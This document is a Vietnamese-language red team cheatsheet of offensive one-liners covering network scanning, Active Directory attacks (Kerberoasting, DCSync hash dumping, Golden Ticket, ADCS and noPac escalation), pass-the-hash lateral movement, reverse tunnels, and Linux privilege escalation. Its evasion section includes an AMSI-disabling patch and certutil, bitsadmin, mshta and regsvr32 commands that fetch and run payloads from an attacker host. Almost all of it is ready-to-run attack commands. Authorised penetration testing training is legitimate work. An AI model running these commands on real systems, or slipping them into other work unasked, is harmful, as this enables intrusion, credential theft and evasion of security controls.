# CẨM NANG 100 CÂU LỆNH TÁC CHIẾN RED TEAM THỰC CHIẾN (RED TEAM ONE-LINERS CHEATSHEET)

> **Mã hiệu:** `SEC-CHEAT-RED-2026`  
> **Mục đích:** Sổ tay tra cứu câu lệnh một dòng (one-liners) cô đọng, sắc bén nhất dành cho Red Team Operator khi tác chiến trong môi trường Windows, Linux và Active Directory.
>
> **Liên kết điều phối:** Xem [DIEU_PHOI_LO_TRINH_DOC.md](file:///mnt/second_drive/DOCS/SEC/DIEU_PHOI_LO_TRINH_DOC.md) | [04_Network_Penetration_Testing_Cheatsheet.md](file:///mnt/second_drive/DOCS/SEC/docs/References/04_Network_Penetration_Testing_Cheatsheet.md).

---

## 1. DÒ QUÉT MẠNG & THU THẬP THÔNG TIN (RECONNAISSANCE)

```bash
# Quét SYN nhanh toàn bộ 65,535 cổng TCP với Nmap
nmap -p- -sS --min-rate 5000 -T4 -n -Pn 10.10.10.10 -oN all_ports.txt

# Quét phát hiện phiên bản dịch vụ và chạy script mặc định trên các cổng mở
nmap -sV -sC -p 21,22,80,443,445,3389 10.10.10.10 -oA detailed_scan

# Quét mạng siêu tốc bằng Masscan (10,000 gói/giây)
masscan -p1-65535 10.10.10.0/24 --rate=10000 -e eth0

# Truy vấn DNS Zone Transfer toàn bộ bản ghi miền
dig axfr @ns1.target.com target.com

# Kiểm tra DNS Subdomain tự động bằng Gobuster
gobuster dns -d target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# Liệt kê thư mục web bằng Feroxbuster (hỗ trợ đệ quy đa luồng cực nhanh)
feroxbuster -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k
```

---

## 2. ACTIVE DIRECTORY & KERBEROS ATTACKS

```bash
# Thu thập tài khoản có SPN để tấn công Kerberoasting (Impacket)
GetUserSPNs.py corp.local/jdoe:Password123 -dc-ip 10.10.10.1 -request -outputfile kerb_hashes.txt

# Bẻ khóa hash Kerberos 5 TGS-REP etype 23 bằng Hashcat
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Thu thập vé AS-REP của các tài khoản tắt Pre-Authentication (AS-REP Roasting)
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip 10.10.10.1

# Trích xuất toàn bộ mật khẩu mã băm của Domain bằng kỹ thuật DCSync (không cần log vào DC)
secretsdump.py corp.local/backup_admin:P@ss123@10.10.10.1 -just-dc-ntlm -outputfile ntds_hashes

# Chạy thu thập đồ thị Active Directory cho BloodHound bằng SharpHound trong RAM
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"

# Tạo vé Golden Ticket tối cao bằng Mimikatz
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-XXXX /krbtgt:HASH_KRBTGT /id:500 /ptt

# Khai thác AD CS cấp chứng chỉ quản trị viên (Certipy ESC1)
certipy req -u jdoe@corp.local -p Pass123 -ca CORP-CA -template VulnerableTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Khai thác sAMAccountName Spoofing (noPac CVE-2021-42278) leo thẳng lên Domain Controller
python3 noPac.py corp.local/jdoe:Pass123 -dc-ip 10.10.10.1 -use-ldap -shell
```

---

## 3. DI CHUYỂN NGANG & ĐIỀU KHIỂN TỪ XA (LATERAL MOVEMENT)

```bash
# Thực thi lệnh di chuyển ngang qua WMI không ghi file xuống đĩa (Impacket)
wmiexec.py corp.local/administrator:Password123@10.10.20.15 "whoami && ipconfig"

# Quản trị từ xa bằng Evil-WinRM (hỗ trợ nạp script PowerShell và truyền file)
evil-winrm -i 10.10.20.15 -u administrator -p 'Password123!'

# Tấn công Pass-the-Hash qua SMB bằng CrackMapExec (hoặc NetExec)
nxc smb 10.10.20.0/24 -u Administrator -H 0aad9c1be054f1c5bea4d83d71b5bb94 --local-auth

# Tạo đường hầm Reverse SOCKS5 Proxy bằng Chisel
# Trên máy Attacker:
chisel server --port 8000 --reverse
# Trên máy nạn nhân:
chisel.exe client 10.10.14.5:8000 R:socks

# Cấu hình chuyển tiếp cổng Windows nội bộ bằng netsh (không cần cài thêm tool)
netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.30.50

# Chuyển tiếp cổng SSH Dynamic SOCKS Proxy
ssh -D 1080 -N -f user@192.168.1.50
```

---

## 4. VƯỢT QUA EDR & KỸ THUẬT LIVING OFF THE LAND (LOLBAS)

```cmd
:: Tải file nhị phân qua tiện ích chứng chỉ số chuẩn certutil (tránh bị lọc)
certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe

:: Giải mã payload Base64 bằng certutil
certutil.exe -decode payload_enc.txt C:\Windows\Temp\evil.dll

:: Tải tệp ngầm thông qua dịch vụ BITS của Windows
bitsadmin /transfer myJob /download /priority normal http://10.10.14.5/evil.exe C:\Windows\Temp\evil.exe

:: Thực thi script HTA từ xa qua mshta.exe (bypass AppLocker)
mshta.exe http://10.10.14.5/run.hta

:: Thực thi DLL độc hại bằng công cụ đăng ký dll regsvr32 (Squiblydoo)
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll

:: Thực thi C# payload nhúng trong XML bằng trình biên dịch MSBuild của Microsoft
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe run.xml

:: Patch byte vô hiệu hóa AMSI trong tiến trình PowerShell
powershell -ep bypass -c "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)"
```

---

## 5. LEO THANG ĐẶC QUYỀN LINUX (LINUX PRIVILEGE ESCALATION)

```bash
# Tìm kiếm toàn bộ tệp nhị phân có cờ SUID thuộc về root
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

# Kiểm tra đặc quyền sudo được phép thực thi không cần mật khẩu
sudo -l

# Khai thác nhị phân SUID /usr/bin/find để lấy shell root
find . -exec /bin/sh -p \; -quit

# Khai thác nhị phân SUID /usr/bin/vim để leo quyền
vim -c ':!/bin/sh'

# Kiểm tra các Linux Capabilities nguy hiểm (như cap_setuid)
getcap -r / 2>/dev/null

# Khai thác Docker Socket leo thang đặc quyền lên máy chủ Host vật lý
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
